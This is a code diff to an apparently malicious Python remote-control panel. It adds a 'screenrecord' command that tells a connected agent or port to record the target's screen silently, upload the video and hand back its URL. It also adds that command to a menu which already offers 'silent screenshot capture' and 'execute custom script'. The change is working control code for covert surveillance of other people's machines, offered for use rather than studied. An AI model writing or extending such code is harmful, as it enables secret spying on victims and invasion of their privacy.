@@ -1529,6 +1529,95 @@ def cmd_dex(revamp=False):
 
     input("\n  Press Enter to continue...")
 
+def cmd_screenrecord(args=None):
+    """Silent screen recording from agent/port"""
+    global connected_account, private_agent_id
+
+    if not connected_account and not private_agent_id:
+        clear()
+        banner()
+        print("\n  \033[38;5;196m✗ No active connection\033[0m")
+        print("  \033[38;5;93m→ Run 'runport' or 'agent' command first\033[0m\n")
+        input("\n  Press Enter to continue...")
+        return
+
+    duration = 5
+    if args:
+        try:
+            duration = int(args.replace("--", ""))
+            if duration > 10: duration = 10
+        except:
+            pass
+
+    use_agent = private_agent_id and not connected_account
+    target_id = private_agent_id if use_agent else connected_account
+
+    clear()
+    banner()
+    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
+    print("\033[38;5;141m║          SILENT SCREEN RECORDING              ║\033[0m")
+    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")
+
+    print(f"  \033[38;5;93m→ Target: {target_id} {'(Agent)' if use_agent else '(Port)'}\033[0m")
+    print(f"  \033[38;5;135m→ Initiating {duration}s silent recording...\033[0m")
+    print(f"  \033[38;5;93m→ This may take a while to process...\033[0m\n")
+
+    if use_agent:
+        result = send_agent_command(target_id, "screenrecord", {"duration": duration})
+    else:
+        result = send_command(target_id, "screenrecord", {"duration": duration})
+
+    if not result.get("success"):
+        print(f"\n  \033[38;5;196m✗ Failed to initiate recording\033[0m")
+        print(f"  Error: {result.get('error', 'Unknown')}")
+        input("\n  Press Enter to continue...")
+        return
+
+    print(f"  \033[38;5;141m✓ Recording initiated successfully\033[0m")
+    print(f"  \033[38;5;93m→ Capturing and uploading frames...\033[0m\n")
+
+    # Polling for recording
+    url = "PENDING"
+    for attempt in range(120): # Up to 4 mins
+        dots = "." * ((attempt % 3) + 1) + " " * (2 - (attempt % 3))
+        print(f"  \033[38;5;135m⏳ Processing Video{dots}\033[0m", end='\r', flush=True)
+        time.sleep(2)
+
+        if use_agent:
+            check_result = send_agent_command(target_id, "record_status")
+        else:
+            check_result = send_command(target_id, "record_status")
+
+        if check_result.get("success"):
+            data = check_result.get("data")
+            if isinstance(data, str):
+                if data.startswith("http"):
+                    url = data
+                    break
+                elif "ERROR" in data.upper() or "FAILED" in data.upper():
+                    url = data
+                    break
+            elif isinstance(data, dict):
+                res = data.get("response") or data.get("url") or data.get("data")
+                if isinstance(res, str) and res.startswith("http"):
+                    url = res
+                    break
+
+    clear()
+    banner()
+    print("\033[38;5;141m╔═══════════════════════════════════════════════╗\033[0m")
+    print("\033[38;5;141m║          SILENT SCREEN RECORDING              ║\033[0m")
+    print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")
+
+    if url != "PENDING" and not url.startswith("ERROR"):
+        print(f"  \033[38;5;141m✓ Video recorded successfully!\033[0m\n")
+    else:
+        print(f"  \033[38;5;196m✗ Recording timed out or failed\033[0m\n")
+
+    print(f"  \033[38;5;135mVideo URL:\033[0m")
+    print(f"  \033[38;5;141m→ {url}\033[0m\n")
+    input("\n  Press Enter to continue...")
+
 def cmd_search(query=None):
     """Search for scripts on ScriptBlox or RScripts"""
     clear()
@@ -1693,6 +1782,7 @@ def main():
         print("  \033[38;5;93m• exe\033[0m           → Execute custom script")
         print("  \033[38;5;93m• search\033[0m        → Search ScriptBlox/RScripts")
         print("  \033[38;5;93m• screenshot\033[0m    → Silent screenshot capture")
+        print("  \033[38;5;93m• screenrecord\033[0m  → Silent screen recording")
 
         print("\n  \033[38;5;135mAGENT COMMANDS:\033[0m")
         print("  \033[38;5;141m• agent\033[0m         → Setup private agent")
@@ -1732,6 +1822,9 @@ def main():
             cmd_search(q if q else None)
         elif choice == "screenshot":
             cmd_screenshot()
+        elif choice.startswith("screenrecord"):
+            args = choice.replace("screenrecord", "", 1).strip()
+            cmd_screenrecord(args if args else None)
         elif choice == "agent":
             cmd_agent()
         elif choice == "agent --list":
